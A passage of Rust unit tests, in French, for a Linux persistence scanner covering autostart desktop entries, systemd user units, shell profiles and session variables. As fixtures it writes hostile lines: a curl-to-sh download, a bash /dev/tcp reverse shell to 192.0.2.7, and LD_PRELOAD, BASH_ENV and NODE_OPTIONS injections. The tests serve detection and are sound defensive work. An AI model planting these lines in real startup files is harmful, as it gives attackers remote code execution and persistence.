                "/usr/bin/cp H/Documents/x H/.co%cstart/y.desktop",
                true,
            ),
            (
                "%c en mot entier",
                "H/.config/autostart/y.desktop",
                "/usr/bin/cp H/Documents/x %c",
                true,
            ),
            (
                "%z inconnu collé",
                "essai",
                "/usr/bin/cp H/Documents/x H/.config/auto%zstart/y.desktop",
                true,
            ),
            (
                "témoin %c, Name ordinaire",
                "essai",
                "/usr/bin/cp H/Documents/x H/.config/auto%cstart/y.desktop",
                false,
            ),
            (
                "témoin %f en mot entier",
                "essai",
                "/usr/bin/cp H/Documents/x H/Documents/z %f",
                false,
            ),
            (
                "témoin %% collé",
                "essai",
                "/usr/bin/cp H/Documents/x H/Documents/a%%fb",
                false,
            ),
            (
                "témoin %U",
                "essai",
                "/usr/bin/cp H/Documents/x H/Documents/z %U",
                false,
            ),
            (
                "sans Name, %c",
                "-",
                "/usr/bin/cp H/Documents/x H/.config/auto%fstart/y.desktop %c",
                true,
            ),
            (
                "%é collé, non vérifié",
                "essai",
                "/usr/bin/cp H/Documents/x H/Documents/a%éb",
                true,
            ),
            (
                "t01 %c collé, sans Name",
                "-",
                "/usr/bin/cp H/Documents/x H/.config/auto%cstart/y.desktop",
                true,
            ),
            (
                "t17 %c collé, Name=bad\\q",
                "Name=bad\\q\n",
                "/usr/bin/cp H/Documents/x H/.config/auto%cstart/y.desktop",
                true,
            ),
            (
                "v06 %c collé, Name qui n'est pas de l'UTF-8",
                "octet",
                "/usr/bin/cp H/Documents/x H/.config/auto%cstart/y.desktop",
                true,
            ),
            (
                "v11 %c collé, seulement Name[fr]=bad\\q",
                "Name[fr]=bad\\q\n",
                "/usr/bin/cp H/Documents/x H/.config/auto%cstart/y.desktop",
                true,
            ),
            (
                "témoin %c collé, Name=x et Name[fr]=bad\\q",
                "Name=x\nName[fr]=bad\\q\n",
                "/usr/bin/cp H/Documents/x H/.config/auto%cstart/y.desktop",
                false,
            ),
        ];
        let mut faux = Vec::new();
        for (i, (nom, name, exec, leve_attendu)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("d2-glib-{i}"));
            let f = m.racine.join("usr/bin/cp");
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(&f, "#!/bin/sh\n").unwrap();
            std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
            std::fs::create_dir_all(m.chemin("Documents")).unwrap();
            let h = m.chemin("").to_string_lossy().trim_end_matches('/').to_string();
            let tete: Vec<u8> = match *name {
                "-" => Vec::new(),
                "octet" => b"Name=b\xe9d\n".to_vec(),
                n if n.starts_with("Name") => n.as_bytes().to_vec(),
                n => format!("Name={}\n", n.replace('H', &h)).into_bytes(),
            };
            let mut ecrit = b"[Desktop Entry]\nType=Application\n".to_vec();
            ecrit.extend(tete);
            ecrit.extend(format!("Exec={}\n", exec.replace('H', &h)).into_bytes());
            m.ecrire(".config/autostart/essai.desktop", "");
            std::fs::write(m.chemin(".config/autostart/essai.desktop"), ecrit).unwrap();
            let leve: Vec<String> = persistance_dans(&m.racine, &m.chemin(""), |_| None, None, None)
                .into_iter()
                .filter(|c| c.probleme.is_some())
                .map(|c| c.message)
                .collect();
            if leve.is_empty() == *leve_attendu {
                faux.push((*nom, leve));
            }
        }
        assert!(faux.is_empty(), "{faux:#?}");
    }

    /// Les commandes d'`exec_de_glib`, mesurées avec gio launch (GLib, `touch` dans un dossier jetable, LANG=C.UTF-8).
    #[test]
    fn exec_de_glib_rend_les_mots_de_gio() {
        type Rendu<'a> = Result<&'a [&'a str], ()>;
        let k = Some("/f/t.desktop");
        // (valeur Exec, Name=, attendu)
        let cas: [(&str, &str, Rendu<'_>); 26] = [
            (r"/usr/bin/touch /d/a%fb", "essai", Ok(&["/usr/bin/touch /d/ab"])),
            (r"/usr/bin/touch /d/a\;b", "essai", Ok(&[])),
            (r"/usr/bin/touch /d/a\xb", "essai", Ok(&[])),
            (
                r"/usr/bin/touch '/d/a\\b'",
                "essai",
                Ok(&[r#"/usr/bin/touch "/d/a\\b""#]),
            ),
            (
                r#"/usr/bin/touch "/d/a\\b""#,
                "essai",
                Ok(&[r#"/usr/bin/touch "/d/a\\b""#]),
            ),
            (
                r#"/usr/bin/touch "/d/a\\\\b""#,
                "essai",
                Ok(&[r#"/usr/bin/touch "/d/a\\b""#]),
            ),
            (r"/usr/bin/touch /d/a%cb", "", Ok(&["/usr/bin/touch /d/ab"])),
            (r"/usr/bin/touch /d/a%cb", "x'y", Ok(&[r#"/usr/bin/touch "/d/ax'yb""#])),
            (
                r#"/usr/bin/touch "/d/a%cb""#,
                "x y",
                Ok(&[r#"/usr/bin/touch "/d/a'x y'b""#]),
            ),
            (
                r"/usr/bin/touch /d/a#b /d/c #/d/d",
                "essai",
                Ok(&["/usr/bin/touch /d/a#b /d/c"]),
            ),
            (
                r"/usr/bin/touch /d/a\rb",
                "essai",
                Ok(&[r#"/usr/bin/touch "/d/a\x0db""#]),
            ),
            (r"/usr/bin/touch /d/x\", "essai", Ok(&[])),
            (r"/usr/bin/touch /d/a\\x6fb", "essai", Ok(&["/usr/bin/touch /d/ax6fb"])),
            (
                r"/usr/bin/touch /d/a%b /d/c%",
                "essai",
                Ok(&["/usr/bin/touch /d/a /d/c%"]),
            ),
            (
                r"/usr/bin/touch /d/a%kb",
                "essai",
                Ok(&["/usr/bin/touch /d/a/f/t.desktopb"]),
            ),
            (
                r#"/usr/bin/touch "/d/a" /d/b\t/d/c"#,
                "essai",
                Ok(&["/usr/bin/touch /d/a /d/b /d/c"]),
            ),
            (r"/usr/bin/touch /d/a%%fb", "essai", Ok(&["/usr/bin/touch /d/a%fb"])),
            (
                r"/usr/bin/touch --x %i",
                "essai",
                Ok(&["/usr/bin/touch --x", "/usr/bin/touch --x --icon ic"]),
            ),
            (r"/usr/bin/touch /d/a%éb", "essai", Err(())),
            (r#"/usr/bin/touch "/d/a\\$b""#, "essai", Ok(&["/usr/bin/touch /d/a$b"])),
            (
                r#"/usr/bin/touch "/d/a\\`b" "/d/c\\qd""#,
                "essai",
                Ok(&[r#"/usr/bin/touch /d/a`b "/d/c\\qd""#]),
            ),
            (
                r"/usr/bin/touch /d/c\t#/d/d",
                "essai",
                Ok(&["/usr/bin/touch /d/c #/d/d"]),
            ),
            (
                r"/usr/bin/touch /d/e #x\n/d/f",
                "essai",
                Ok(&["/usr/bin/touch /d/e /d/f"]),
            ),
            (r"/usr/bin/touch /d/a\\", "essai", Ok(&[])),
            (
                r#"/usr/bin/touch "/d/a\\"b c""#,
                "essai",
                Ok(&[r#"/usr/bin/touch "/d/a\"b c""#]),
            ),
            (r#"/usr/bin/touch "/d/a"#, "essai", Ok(&[])),
        ];
        for (valeur, nom, attendu) in cas {
            let rendu = exec_de_glib(valeur, &[nom.to_string()], false, &["ic".to_string()], k);
            let attendu = attendu.map(|a| a.iter().map(|m| (*m).to_string()).collect::<Vec<_>>());
            assert_eq!(rendu, attendu, "{valeur}");
        }
        assert_eq!(exec_de_glib("/usr/bin/touch %k", &[], false, &[], None), Err(()));
        let noms: Vec<String> = (0..40).map(|i| format!("n{i}")).collect();
        assert_eq!(exec_de_glib("/usr/bin/touch %c", &noms, false, &[], k), Err(()));
        assert_eq!(
            exec_de_glib("/usr/bin/touch %%c", &noms, false, &[], k).map(|f| f.len()),
            Ok(1)
        );
        // E-1 (revérification 10) : sans nom lisible, GLib remplace « %c » par rien (mesuré : « a%cb » crée « ab »,
        // « %c » seul ne donne aucun argument) ; un Name= vide donne un argument vide. « Unnamed » n'est jamais lancé.
        let sans: Rendu<'_> = Ok(&["/usr/bin/touch /d/ab"]);
        let rendu = exec_de_glib("/usr/bin/touch /d/a%cb", &[], true, &[], k);
        assert_eq!(
            rendu,
            sans.map(|a| a.iter().map(|m| (*m).to_string()).collect::<Vec<_>>())
        );
        let rendu = exec_de_glib("/usr/bin/touch %c", &[String::new()], true, &[], k);
        assert_eq!(
            rendu,
            Ok(vec![r#"/usr/bin/touch """#.to_string(), "/usr/bin/touch".to_string()])
        );
        assert_eq!(
            exec_de_glib("/usr/bin/touch %c", &noms, true, &[], k),
            Err(()),
            "le cas sans nom compte"
        );
    }

    /// E-1 (revérification 10) : les noms qu'une entrée de bureau donne à « %c », mesurés avec gio launch (LANG=C.UTF-8
    /// et fr_CA.UTF-8) : le dernier Name= non traduit lisible, sinon aucun nom ; un Name[..] lisible selon la langue.
    #[test]
    fn formes_de_glib_essaie_aussi_sans_nom() {
        let f = Path::new("/f/t.desktop");
        let exec = "/usr/bin/touch /d/a%cb";
        // (nom, lignes avant Exec=, formes attendues)
        let cas: [(&str, &str, &[&str]); 8] = [
            ("t01 sans Name", "", &["/usr/bin/touch /d/ab"]),
            ("t17 Name=bad\\q", "Name=bad\\q\n", &["/usr/bin/touch /d/ab"]),
            (
                "v06 Name qui n'est pas de l'UTF-8 (lu avec pertes)",
                "Name=b\u{FFFD}d\n",
                &["/usr/bin/touch /d/ab\u{FFFD}db", "/usr/bin/touch /d/ab"],
            ),
            (
                "v11 seulement Name[fr]=bad\\q",
                "Name[fr]=bad\\q\n",
                &["/usr/bin/touch /d/ab"],
            ),
            (
                "seulement Name[fr]=y",
                "Name[fr]=y\n",
                &["/usr/bin/touch /d/ayb", "/usr/bin/touch /d/ab"],
            ),
            (
                "Name=x puis Name=bad\\q (le dernier compte)",
                "Name=x\nName=bad\\q\n",
                &["/usr/bin/touch /d/axb", "/usr/bin/touch /d/ab"],
            ),
            ("témoin Name=x", "Name=x\n", &["/usr/bin/touch /d/axb"]),
            (
                "témoin Name=x, Name[fr]=bad\\q",
                "Name=x\nName[fr]=bad\\q\n",
                &["/usr/bin/touch /d/axb"],
            ),
        ];
        for (nom, tete, attendu) in cas {
            let texte = format!("[Desktop Entry]\nType=Application\n{tete}Exec={exec}\n");
            let attendu: Vec<String> = attendu.iter().map(|m| (*m).to_string()).collect();
            assert_eq!(formes_de_glib(exec, &texte, f), Ok(attendu), "{nom}");
        }
    }

    /// B-2 (revérification 7) : un argument relatif depuis un dossier de départ inconnu (Path= d'une entrée de bureau,
    /// WorkingDirectory= avec « - » d'une unité) se lève en Élevé avec la vraie raison, sa clé et l'argument ; pas
    /// « nomme un lieu de démarrage », qu'il ne nomme pas. Depuis un dossier connu, un relatif vers un lieu garde
    /// cette raison-là ; un argument absolu ou sans chemin reste muet.
    #[test]
    fn dossier_de_depart_inconnu_se_dit() {
        use std::os::unix::fs::PermissionsExt as _;
        type Attendu<'a> = Option<(&'a [&'a str], &'a str)>;
        const BUREAU: &str = ".config/autostart/essai.desktop";
        const UNITE: &str = ".config/systemd/user/essai.service";
        let bureau = |path: &str, exec: &str| format!("[Desktop Entry]\nType=Application\nName=essai\n{path}{exec}\n");
        let unite = |courant: &str, exec: &str| format!("[Service]\nType=oneshot\n{courant}ExecStart={exec}\n");
        // (nom, fichier, contenu, attendu : None muet, Some(textes que le message porte, texte qu'il ne porte pas))
        let depart_bureau: &[&str] = &["dossier de départ (Path=) non vérifié", "« reglages.ini »"];
        let cas: Vec<(&str, &str, String, Attendu<'_>)> = vec![
            (
                "N4",
                BUREAU,
                bureau("Path=/opt/app\n", "Exec=/opt/app/lance --config=reglages.ini"),
                Some((depart_bureau, "nomme un lieu")),
            ),
            (
                "N5",
                BUREAU,
                bureau("Path=/opt/app\n", "Exec=/opt/app/lance reglages.ini"),
                Some((depart_bureau, "nomme un lieu")),
            ),
            (
                "unité, WorkingDirectory=-",
                UNITE,
                unite("WorkingDirectory=-/opt/app\n", "/usr/bin/cp /opt/app/a b.txt"),
                Some((
                    &["dossier de départ (WorkingDirectory=) non vérifié", "« b.txt »"],
                    "nomme un lieu",
                )),
            ),
            (
                "unité, dossier connu",
                UNITE,
                unite("", "/usr/bin/cp /opt/app/a .config/autostart/x.desktop"),
                Some((&["nomme un lieu de démarrage du compte"], "dossier de départ")),
            ),
            (
                "N1 absolu",
                BUREAU,
                bureau("Path=/opt/app\n", "Exec=/opt/app/lance /opt/app/a"),
                None,
            ),
            (
                "N3 sans argument",
                BUREAU,
                bureau("Path=/opt/app\n", "Exec=/opt/app/lance -v"),
                None,
            ),
            (
                "sans Path=",
                BUREAU,
                bureau("", "Exec=/opt/app/lance reglages.ini"),
                None,
            ),
        ];
        let mut faux = Vec::new();
        for (i, (nom, fichier, contenu, attendu)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("b2-depart-{i}"));
            for programme in ["usr/bin/cp", "opt/app/lance"] {
                let f = m.racine.join(programme);
                std::fs::create_dir_all(f.parent().unwrap()).unwrap();
                std::fs::write(&f, "#!/bin/sh\n").unwrap();
                std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
            }
            m.ecrire(fichier, contenu);
            let leves: Vec<(Option<Niveau>, String)> = persistance_dans(&m.racine, &m.chemin(""), |_| None, None, None)
                .into_iter()
                .filter(|c| c.probleme.is_some())
                .map(|c| (c.probleme, c.message))
                .collect();
            let juste = match attendu {
                Some((porte, pas)) => leves.iter().any(|(niveau, l)| {
                    *niveau == Some(Niveau::Eleve) && porte.iter().all(|x| l.contains(x)) && !l.contains(pas)
                }),
                None => leves.is_empty(),
            };
            if !juste {
                faux.push((*nom, leves));
            }
        }
        assert!(faux.is_empty(), "{faux:#?}");
    }

    /// B-2 : la raison d'un dossier de départ inconnu, FR et EN, sans l'argument (aucun relatif gardé) et avec lui.
    #[test]
    fn la_raison_du_dossier_de_depart_se_dit() {
        let s = permise::Systeme {
            racine: Path::new("/"),
            maison: "/home/alice",
            maisons: &[],
            courant: None,
            noms_des_lieux: std::cell::OnceCell::new(),
            relatif: std::cell::OnceCell::new(),
        };
        let e = permise::Ecart::DossierDeDepart;
        assert!(s.raison_dite(e, "Path=").contains("(WorkingDirectory= ou Path=)"));
        assert_eq!(
            s.raison_dite(permise::Ecart::Chemin, "Path="),
            permise::Ecart::Chemin.raison()
        );
        let _ = s.relatif.set("a\u{1b}[31m".to_string() + &"x".repeat(200));
        let dite = s.raison_dite(e, "Path=");
        assert!(
            dite.starts_with("dossier de départ (Path=) non vérifié : l'argument relatif « a"),
            "{dite}"
        );
        assert!(!dite.contains('\u{1b}') && !dite.contains(&"x".repeat(80)), "{dite}");
        // Coupé, il le montre (revérification 8) ; entier, rien ne s'ajoute.
        assert!(dite.contains("x… »"), "{dite}");
        let entier = permise::Systeme {
            racine: Path::new("/"),
            maison: "/home/alice",
            maisons: &[],
            courant: None,
            noms_des_lieux: std::cell::OnceCell::new(),
            relatif: std::cell::OnceCell::new(),
        };
        let _ = entier.relatif.set("x".repeat(80));
        let dite = entier.raison_dite(e, "Path=");
        assert!(dite.contains(&format!("« {} »", "x".repeat(80))), "{dite}");
        crate::langue::en_anglais(|| {
            let dite = s.raison_dite(e, "WorkingDirectory=");
            assert!(
                dite.starts_with("working folder (WorkingDirectory=) not verified: the relative argument"),
                "{dite}"
            );
            assert!(s.raison_dite(e, "x").contains("not verified, so not kept quiet"));
        });
    }

    /// B-1 (revérification 7) : une entrée de démarrage du compte sous une forme que systemd lit autrement qu'un autre
    /// lanceur se lève en Élevé, son message nommant la forme ; une forme sans double lecture reste muette.
    #[test]
    fn une_forme_trompeuse_d_une_entree_de_bureau_se_leve() {
        const TETE: &str = "[Desktop Entry]\nType=Application\nName=essai\n";
        const EXEC: &str = "Exec=/usr/bin/true\n";
        let cas: Vec<(&str, String, Option<&str>)> = vec![
            (
                "retour chariot seul",
                format!("{TETE}Comment=x\r{EXEC}"),
                Some("retour chariot seul"),
            ),
            ("retour chariot final", format!("{TETE}{EXEC}Comment=x\r"), None),
            (
                "retour chariot au milieu de la dernière ligne",
                format!("{TETE}{EXEC}Comment=x\rName=b"),
                Some("retour chariot seul"),
            ),
            ("octet nul", format!("{TETE}Comment=x\0{EXEC}"), Some("octet nul")),
            ("BOM en tête", format!("\u{FEFF}{TETE}{EXEC}"), Some("U+FEFF")),
            (
                "BOM au milieu",
                format!("{TETE}Comment=a\u{FEFF}b\n{EXEC}"),
                Some("U+FEFF"),
            ),
            ("deux Name=", format!("{TETE}Name=autre\n{EXEC}"), None),
            (
                "deux StartupWMClass=",
                format!("{TETE}StartupWMClass=a\nStartupWMClass=b\n{EXEC}"),
                None,
            ),
            (
                "Name= puis deux Hidden=",
                format!("{TETE}Name=autre\nHidden=true\nHidden=false\n{EXEC}"),
                Some("« Hidden » écrite deux fois"),
            ),
            (
                "deux X-GNOME-Autostart-enabled=",
                format!("{TETE}X-GNOME-Autostart-enabled=false\nX-GNOME-Autostart-enabled=true\n{EXEC}"),
                Some("« X-GNOME-Autostart-enabled » écrite deux fois"),
            ),
            (
                "deux Path=",
                format!("{TETE}Path=\nPath=/opt\n{EXEC}"),
                Some("« Path » écrite deux fois"),
            ),
            (
                "deux Exec=",
                format!("{TETE}{EXEC}Exec=/usr/bin/false\n"),
                Some("« Exec » écrite deux fois"),
            ),
            (
                "suite par \\",
                format!("{TETE}Comment=a\\\nPath=/\n{EXEC}"),
                Some("finie par « \\ »"),
            ),
            ("« \\\\ » en fin de ligne", format!("{TETE}Comment=a\\\\\n{EXEC}"), None),
            ("CRLF", format!("{TETE}{EXEC}").replace('\n', "\r\n"), None),
            ("deux fois la même valeur", format!("{TETE}Name=essai\n{EXEC}"), None),
            ("Name[fr]= et Name=", format!("{TETE}Name[fr]=autre\n{EXEC}"), None),
            (
                "Name= d'une action",
                format!("{TETE}{EXEC}[Desktop Action a]\nName=autre\n"),
                None,
            ),
            (
                "deux groupes, une clé chacun",
                format!("{TETE}[Desktop Entry]\n{EXEC}"),
                None,
            ),
        ];
        let mut faux = Vec::new();
        for (i, (nom, contenu, attendu)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("b1-forme-{i}"));
            m.ecrire(".config/autostart/essai.desktop", contenu);
            let leves: Vec<(Option<Niveau>, String)> = persistance_dans(&m.racine, &m.chemin(""), |_| None, None, None)
                .into_iter()
                .filter(|c| c.probleme.is_some())
                .map(|c| (c.probleme, c.message))
                .collect();
            let juste = match attendu {
                Some(forme) => leves.iter().any(|(niveau, l)| {
                    *niveau == Some(Niveau::Eleve) && l.contains("forme trompeuse") && l.contains(forme)
                }),
                None => leves.is_empty(),
            };
            if !juste {
                faux.push((*nom, leves));
            }
        }
        assert!(faux.is_empty(), "{faux:#?}");
    }

    /// Le cas qui a mené à ce lot (valeurs inventées) : une unité de l'utilisateur lance un programme d'un dossier
    /// caché, à corriger soi-même. Elle se déclare normale, montre sa ligne, son fichier et le programme lancé ; le
    /// même état relu au bilan suivant est tu.
    #[test]
    fn unite_de_l_utilisateur_declarable() {
        use crate::machine::temoins::Temoins;
        let m = maison_avec_rappel("declarable");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        let k = c.correctif.as_ref().unwrap();
        assert!(!k.automatique, "une ligne du dossier personnel reste à la main");
        let Temoins::Releves(_) = c.temoins() else {
            panic!("{:?}", c.temoins());
        };
        let lignes = c.temoins().lignes();
        assert_eq!(lignes.len(), 1);
        assert_eq!(lignes[0].ou, "~/.config/systemd/user/rappel.service:6");
        assert_eq!(lignes[0].ligne, "ExecStart=%h/.cache-x/rappel.sh");
        assert!(lignes[0].contenant.is_some());
        assert_eq!(lignes[0].cibles.len(), 2);
        assert_eq!(lignes[0].cibles[0].chemin, "~/.cache-x/rappel.sh");
        assert_eq!(
            lignes[0].cibles[1].chemin, ENVIRONNEMENT,
            "l'environnement des sessions est lié"
        );
        assert!(crate::apprentissage::declarable(&c).is_ok());
        let encore = m.lancements();
        assert_eq!(c.temoins().empreinte(), encore.temoins().empreinte());
        assert!(crate::apprentissage::essai_tait(&c, &encore));
    }

    /// Le modèle de menace du lot, cas par cas : après un choix « normal », chaque changement fait revenir l'alerte.
    #[test]
    fn tout_changement_fait_revenir_l_alerte() {
        type Changement = fn(&Maison);
        let cas: [(&str, Changement); 26] = [
            ("unité changée", |m| {
                m.ecrire(
                    ".config/systemd/user/rappel.service",
                    &format!("{UNITE}Environment=LANG=C\n"),
                );
            }),
            ("unité remplacée par un lien au même contenu", |m| {
                m.ecrire(".local/share/ailleurs.service", UNITE);
                let p = m.chemin(".config/systemd/user/rappel.service");
                std::fs::remove_file(&p).unwrap();
                std::os::unix::fs::symlink(m.chemin(".local/share/ailleurs.service"), &p).unwrap();
            }),
            ("programme lancé changé", |m| {
                m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\ncurl -s http://192.0.2.7/x | sh\n");
            }),
            ("programme lancé remplacé par un lien", |m| {
                m.ecrire(".cache-x/vrai.sh", "#!/bin/sh\necho rappel\n");
                let p = m.chemin(".cache-x/rappel.sh");
                std::fs::remove_file(&p).unwrap();
                std::os::unix::fs::symlink(m.chemin(".cache-x/vrai.sh"), &p).unwrap();
            }),
            ("programme lancé effacé", |m| {
                std::fs::remove_file(m.chemin(".cache-x/rappel.sh")).unwrap();
            }),
            ("ligne ajoutée dans le même fichier", |m| {
                m.ecrire(
                    ".config/systemd/user/rappel.service",
                    &format!("{UNITE}ExecStartPost=%h/.cache-x/autre.sh\n"),
                );
            }),
            ("autre source dans la même alerte", |m| {
                m.ecrire(".config/autostart/maj.desktop", "[Desktop Entry]\nExec=/tmp/.x/agent\n");
            }),
            ("ligne de la crontab dans un fichier lu", |m| {
                m.ecrire(".bashrc", "export LD_PRELOAD=/tmp/.l/libz.so\n");
            }),
            ("ajout (drop-in) posé", |m| {
                m.ecrire(".config/systemd/user/rappel.service.d/x.conf", "[Service]\nNice=5\n");
            }),
            ("ajout de tous les services posé", |m| {
                m.ecrire(".config/systemd/user/service.d/x.conf", "[Service]\nNice=5\n");
            }),
            ("ajout posé dans le dossier de la session", |m| {
                let d = m.racine.join("run/user/1000/systemd/user/rappel.service.d");
                std::fs::create_dir_all(&d).unwrap();
                std::fs::write(d.join("x.conf"), "[Service]\nNice=5\n").unwrap();
            }),
            ("même ligne, autre programme", |m| {
                m.ecrire(
                    ".config/systemd/user/rappel.service",
                    &UNITE.replace("rappel.sh", "rappel.sh --x"),
                );
            }),
            // Campagne E, F4 : une variable posée pour les sessions change ce que fait la ligne sans toucher à un
            // fichier lié.
            ("variable dans environment.d", |m| {
                m.ecrire(
                    ".config/environment.d/50-x.conf",
                    "BASH_ENV=/home/alice/.cache-x/e.sh
",
                );
            }),
            ("variable par défaut du gestionnaire", |m| {
                m.ecrire(
                    ".config/systemd/user.conf.d/x.conf",
                    "[Manager]\nDefaultEnvironment=PYTHONPATH=/home/alice/.cache-x\n",
                );
            }),
            ("variable de Hyprland", |m| {
                m.ecrire(
                    ".config/hypr/hyprland.conf",
                    "env = NODE_OPTIONS,--require=/home/alice/.e.js\n",
                );
            }),
            ("variable d'un profil", |m| {
                m.ecrire(".profile", "export PS4='$(id)'\n");
            }),
            ("variable de pam_env", |m| {
                m.ecrire(".pam_environment", "PYTHONSTARTUP DEFAULT=/home/alice/.e.py\n");
            }),
            // F5 : un alias de l'unité et son ajout, dans le dossier de la session.
            ("ajout posé sous un alias", |m| {
                let d = m.racine.join("run/user/1000/systemd/user");
                std::fs::create_dir_all(d.join("alias.service.d")).unwrap();
                std::os::unix::fs::symlink(m.chemin(".config/systemd/user/rappel.service"), d.join("alias.service"))
                    .unwrap();
                std::fs::write(d.join("alias.service.d/x.conf"), "[Service]\nNice=5\n").unwrap();
            }),
            // M-d : le dossier d'exécution de systemd pour les unités de l'utilisateur.
            ("ajout posé dans /run/systemd/user", |m| {
                let d = m.racine.join("run/systemd/user/rappel.service.d");
                std::fs::create_dir_all(&d).unwrap();
                std::fs::write(d.join("x.conf"), "[Service]\nNice=5\n").unwrap();
            }),
            // M-c : execr-once d'Hyprland.
            ("execr-once d'Hyprland", |m| {
                m.ecrire(".config/hypr/autostart.conf", "execr-once = /tmp/.x/agent\n");
            }),
            // Vérification de la campagne E, N6 : un alias d'alias, nommé par des liens relatifs, et son ajout.
            ("ajout posé sous un alias d'alias", |m| {
                let d = m.racine.join("run/user/1000/systemd/user");
                std::fs::create_dir_all(d.join("alias2.service.d")).unwrap();
                std::os::unix::fs::symlink("rappel.service", d.join("alias.service")).unwrap();
                std::os::unix::fs::symlink("alias.service", d.join("alias2.service")).unwrap();
                std::fs::write(d.join("alias2.service.d/x.conf"), "[Service]\nNice=5\n").unwrap();
            }),
            // N3 : les fichiers des variables liés en entier, ceux que lisent bash, zsh et fish compris.
            ("commentaire d'un profil", |m| m.ecrire(".bashrc", "# note\n")),
            ("bash_login", |m| m.ecrire(".bash_login", "export GTK_MODULES=x\n")),
            ("zlogin", |m| m.ecrire(".zlogin", "export GTK_MODULES=x\n")),
            ("configuration de fish", |m| {
                m.ecrire(".config/fish/conf.d/x.fish", "set -gx GTK_MODULES x\n");
            }),
            ("variable de Hyprland par un autre dossier", |m| {
                m.ecrire(".config/hypr/hyprland.conf", "source = ~/.autres/v.conf\n");
                m.ecrire(".autres/v.conf", "env = GTK_MODULES,x\n");
            }),
        ];
        for (nom, changer) in cas {
            let m = maison_avec_rappel(&format!("revient-{}", nom.len()));
            let declare = m.lancements();
            assert!(crate::apprentissage::essai_tait(&declare, &m.lancements()), "{nom}");
            changer(&m);
            let plus_tard = m.lancements();
            assert!(plus_tard.probleme >= Some(Niveau::Eleve), "{nom}");
            assert_ne!(declare.temoins().empreinte(), plus_tard.temoins().empreinte(), "{nom}");
            assert!(
                !crate::apprentissage::essai_tait(&declare, &plus_tard),
                "{nom} : l'alerte doit revenir"
            );
        }
    }

    /// Ce qui ne se relève pas ne se déclare pas normal : une commande ambiguë, un programme illisible, plus de
    /// lignes qu'on n'en montre ; un shell inversé non plus. Et une alerte qui ne se relève plus n'est plus tue.
    #[test]
    fn releves_refuses() {
        use crate::machine::temoins::{TEMOINS_MAX, Temoins};
        let refuse = |m: &Maison| matches!(m.lancements().temoins(), Temoins::Refuse(_));
        let m = Maison::nouvelle("ambigu");
        m.ecrire(
            ".config/systemd/user/a.service",
            "[Service]\nExecStart=%h/.x/run $ARGUMENTS\n",
        );
        assert!(refuse(&m));
        assert!(crate::apprentissage::declarable(&m.lancements()).is_err());
        let m = Maison::nouvelle("inverse");
        m.ecrire(".bashrc", "bash -i >& /dev/tcp/192.0.2.7/4444 0>&1\n");
        assert!(refuse(&m));
        let m = Maison::nouvelle("trop");
        let unite = (0..=TEMOINS_MAX).fold(String::new(), |mut u, i| {
            u.push_str("ExecStartPre=%h/.x/etape");
            u.push_str(&i.to_string());
            u.push('\n');
            u
        });
        m.ecrire(".config/systemd/user/a.service", &format!("[Service]\n{unite}"));
        assert!(refuse(&m));
        // Le programme devenu illisible (un dossier à sa place) : le choix d'hier ne tait plus rien.
        let m = maison_avec_rappel("illisible");
        let declare = m.lancements();
        std::fs::remove_file(m.chemin(".cache-x/rappel.sh")).unwrap();
        std::fs::create_dir_all(m.chemin(".cache-x/rappel.sh")).unwrap();
        let plus_tard = m.lancements();
        assert!(matches!(plus_tard.temoins(), Temoins::Refuse(_)));
        assert!(!crate::apprentissage::essai_tait(&declare, &plus_tard));
    }

    /// Le refus d'une alerte, tel qu'il se montre.
    /// Campagne E, F1 : un octet qui n'est pas de l'UTF-8 dans un fichier de démarrage ou d'environnement : la
    /// ligne ne se déclare pas (lue « avec pertes », elle montrerait et suivrait un autre fichier que celui lancé).
    #[test]
    fn octet_illisible_jamais_declarable() {
        let sources: [(&str, &[u8]); 5] = [
            (
                ".config/systemd/user/rappel.service",
                b"[Service]\nExecStart=%h/.cache-x/rap\xffpel.sh\n",
            ),
            (
                ".config/autostart/maj.desktop",
                b"[Desktop Entry]\nExec=/tmp/.x/ag\xffent\n",
            ),
            (".config/hypr/autostart.conf", b"exec-once = /tmp/.x/ag\xffent\n"),
            (".bashrc", b"export LD_PRELOAD=/tmp/.l/li\xffbz.so\n"),
            (".config/environment.d/50-x.conf", b"LANG=fr\xff\n"),
        ];
        for (i, (fichier, octets)) in sources.into_iter().enumerate() {
            let m = maison_avec_rappel(&format!("octet-{i}"));
            let p = m.chemin(fichier);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(&p, octets).unwrap();
            let c = m.lancements();
            assert!(c.probleme >= Some(Niveau::Eleve), "{fichier}");
            assert!(crate::apprentissage::declarable(&c).is_err(), "{fichier}");
        }
    }

    /// Les variables des sessions liées en entier (vérification de la campagne E, N3) : tout changement d'un de
    /// leurs fichiers, même un commentaire, fait revenir l'alerte ; plus de liste de noms à contourner.
    #[test]
    fn variables_des_sessions_liees_en_entier() {
        for (i, (fichier, texte)) in [
            (".config/environment.d/50-x.conf", "# note\n"),
            (".config/environment.d/50-x.conf", "GTK_MODULES=/tmp/x\n"),
            (".config/environment.d/50-x.conf", "PYTHON\\x5fPATH=/x\n"),
            (".pam_environment", "GDK_PIXBUF_MODULE_FILE DEFAULT=/tmp/x\n"),
            (
                ".config/systemd/user.conf",
                "[Manager]\nDefaultEnvironment=BASH_FUNC_x%%=()\n",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("variables-{i}"));
            let declare = m.lancements();
            m.ecrire(fichier, texte);
            assert!(
                !crate::apprentissage::essai_tait(&declare, &m.lancements()),
                "{fichier} {texte:?}"
            );
        }
    }

    /// Campagne E, M-f : un dossier personnel relatif ne passe jamais pour « rien de suspect ».
    #[test]
    fn dossier_personnel_relatif_dit() {
        let m = maison_avec_rappel("relatif");
        let c = persistance_dans(&m.racine, Path::new("maison"), |_| None, None, None)
            .into_iter()
            .next()
            .unwrap();
        assert!(c.probleme >= Some(Niveau::Eleve), "{:?}", c.probleme);
        assert!(
            c.message.contains("dossier personnel inconnu ou relatif"),
            "{}",
            c.message
        );
        assert!(crate::apprentissage::declarable(&c).is_err());
    }

